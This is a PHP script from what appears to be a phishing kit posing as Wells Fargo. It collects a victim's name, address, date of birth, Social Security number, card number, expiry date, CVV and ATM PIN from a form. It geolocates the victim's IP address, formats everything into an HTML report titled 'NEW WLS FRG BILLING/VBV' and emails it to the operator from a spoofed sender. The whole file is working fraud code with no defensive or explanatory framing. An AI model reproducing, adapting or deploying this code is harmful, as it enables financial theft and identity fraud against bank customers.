<?php
session_start();
$xsam = getenv("REMOTE_ADDR");
include "sand_email.php";
include("blocker.php");
$xadoo = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$xsam");
$COUNTRY = $xadoo->geoplugin_countryName ;  
$ip = getenv("REMOTE_ADDR");
// --------------- VRB
$nam = $_POST['fullnm'];
$cntr = $_POST['countr'];
$cty = $_POST['city'];
$stt = $_POST['stat'];
$addr = $_POST['addres'];
$zpp = $_POST['zip'];
$dbb = $_POST['dob'];
$snn = $_POST['ssn'];
$crd = $_POST['cardnum'];
$exp = $_POST['expdate'];
$ccv = $_POST['cvv'];
$pin = $_POST['atmpin'];
// --------------- VRB
$browser             =   $_SERVER['HTTP_USER_AGENT'];
$msg = "
<html>
    <head>
<style>
*{
font-family:arial;
}
table{
width: 100%;
}
strong{
color: #f91010;
}
</style>
</head>
<table style='width:100%;'>
<tr>
<td style='padding: 3%;background: #3a3535;color: #9e0b17;border-bottom: solid;'>
<strong style='color:#f91010;'><center>| NEW WLS FRG BILLING/VBV |</center></strong>
</td>
</tr>
<tr>
<td style='padding: 3%;background: #3a3535;color: #00B0FF;border-bottom: solid;font-weight: bold;'>
<h2>BILLING Information</h2>
<p>Name: <strong style='color:#f91010;'>".$nam."</strong></p>
<p>Country : <strong style='color:#f91010;'>".$cntr."</strong></p>
<p>City : <strong style='color:#f91010;'>".$cty."</strong></p>
<p>State : <strong style='color:#f91010;'>".$stt."</strong></p>
<p>Address : <strong style='color:#f91010;'>".$addr."</strong></p>
<p>Zip Code : <strong style='color:#f91010;'>".$zpp."</strong></p>
<p>Date of Bith : <strong style='color:#f91010;'>".$dbb."</strong></p>
<p>ssn : <strong style='color:#f91010;'>".$snn."</strong></p>
<hr>
<h2>Card Information</h2>
<hr>
<p>Card Number : <strong style='color:#f91010;'>".$crd."</strong></p>
<p>Expiry Date  : <strong style='color:#f91010;'>".$exp."</strong></p>
<p>Cvv : <strong style='color:#f91010;'>".$ccv."</strong></p>
<p>ATM Card Pin : <strong style='color:#f91010;'>".$pin."</strong></p>
<hr>
<h2>IP Information</h2>
<hr>
<p>IP ADD : <strong style='color:#f91010;'>".$ip."</strong></p>
<p>USER AGENT : <strong style='color:#f91010;'>".$browser."</strong></p>
";
$Subject = "NEW WELLS FARGO  ~ BILLING ~ From ~ [$ip] Country [$COUNTRY]";
$Headers .= "From: MarketSpam.com" . "\r\n"; 
$Headers .= "MIME-Version: 1.0\r\n";
$Headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
mail($youremail,$Subject,$msg,$Headers);
mail(','.$form,$Subject,$msg,$Headers);
header ('Location: ../myaccount/uploads');

?>
